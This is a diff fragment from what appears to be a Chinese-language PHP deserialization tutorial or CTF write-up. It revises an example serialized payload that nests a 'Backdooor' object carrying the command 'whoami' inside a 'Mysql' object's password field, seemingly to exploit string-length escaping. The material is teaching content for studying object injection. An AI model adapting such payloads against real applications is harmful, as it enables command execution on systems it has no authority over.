@@ -64,7 +64,7 @@ class Backdooor{
 就像下面这个样子
 
 ```
-O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";s:5:"test1";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";O:9:"Backdooor":1:{s:3:"cmd";s:6:"whoami";}}
+O:5:"Mysql":7:{s:5:"debug";i:1;s:8:"database";s:6:"test01";s:8:"hostname";s:9:"127.0.0.1";s:4:"port";i:3306;s:7:"charset";s:4:"utf8";s:8:"username";s:4:"root";s:8:"password";s:48:"O:9:"Backdooor":1:{s:3:"cmd";s:10:"whoami    ";}";}
 ```
 
 而我们最后要的效果是（注意引号哦）
